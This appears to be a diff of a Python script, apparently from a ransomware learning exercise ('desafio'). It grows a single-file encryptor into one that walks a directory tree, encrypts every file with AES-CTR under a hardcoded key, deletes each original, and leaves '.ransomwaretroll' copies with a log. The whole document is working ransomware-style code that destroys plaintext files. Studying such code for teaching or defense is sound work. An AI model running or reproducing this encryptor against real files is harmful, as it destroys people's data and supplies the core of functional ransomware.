@@ -1,24 +1,38 @@
 import os
 import pyaes
+from datetime import datetime
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+base_dir = os.path.join(os.path.dirname(__file__), "desafio")
+log_path = os.path.join(os.path.dirname(__file__), "encrypt.log")
 
-## remover o arquivo
-os.remove(file_name)
-
-## chave de criptografia
 key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+def log(mensagem):
+    with open(log_path, "a") as log_file:
+        log_file.write(f"[{datetime.now()}] {mensagem}\n")
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+def criptografar_arquivo(file_path):
+    try:
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+
+        aes = pyaes.AESModeOfOperationCTR(key)
+        crypto_data = aes.encrypt(file_data)
+
+        os.remove(file_path)
+
+        new_file = file_path + ".ransomwaretroll"
+        with open(new_file, "wb") as newfile:
+            newfile.write(crypto_data)
+
+        log(f"Criptografado: {file_path}")
+        print(f"[OK] {file_path}")
+    except Exception as e:
+        log(f"Erro ao criptografar {file_path}: {e}")
+        print(f"[ERRO] {file_path}")
+
+for root, dirs, files in os.walk(base_dir):
+    for file_name in files:
+        full_path = os.path.join(root, file_name)
+        if not file_name.endswith(".ransomwaretroll"):
+            criptografar_arquivo(full_path)
